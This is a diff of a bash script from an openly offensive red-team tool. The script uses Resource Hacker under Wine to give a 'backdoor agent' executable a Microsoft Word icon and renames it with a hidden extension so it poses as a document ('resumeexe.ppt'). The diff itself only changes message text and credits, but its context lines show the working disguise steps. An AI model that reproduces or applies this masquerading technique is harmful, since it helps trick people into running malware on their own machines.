@@ -101,10 +101,10 @@ sleep 1
 fi
 
 if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
-echo ${BlueF}[☆]${white} Wine Program Files '->' ${GreenF}found! ${Reset};
+echo ${BlueF}[☆]${white} Wine ProgramFiles '->' ${GreenF}found! ${Reset};
 sleep 1
 else
-echo ${RedF}[☠]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
+echo ${RedF}[☠]${white} Wine ProgramFiles '->' ${RedF}not found! ${Reset};
 sleep 1
 echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
 winecfg > /dev/null 2>&1
@@ -146,11 +146,11 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --fil
       # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
       echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
       $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
-      echo ${BlueF}[☆]${white} Change backdoor agent icon '->' ${GreenF}done... ${Reset};
+      echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
       sleep 1
 
     # insert .ppt hidden extension
-    echo ${BlueF}[☆]${white} Adding agent hidden extension '->' ${GreenF}done... ${Reset};
+    echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
     mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
     sleep 1
 
@@ -167,8 +167,7 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --fil
 cat << !
 
     Final file  : $IPATH/resumeexe.ppt
-    Credits     : Damon Mohammadbagher
-    Tool Author : r00t-3xp10it (SSA redTeam)
+    Tool Author : r00t-3xp10it (SSA© redTeam)
 
     Your backdoor agent its now transformed into one fake
     word doc (ppt) remmenber that .exe extensions will not
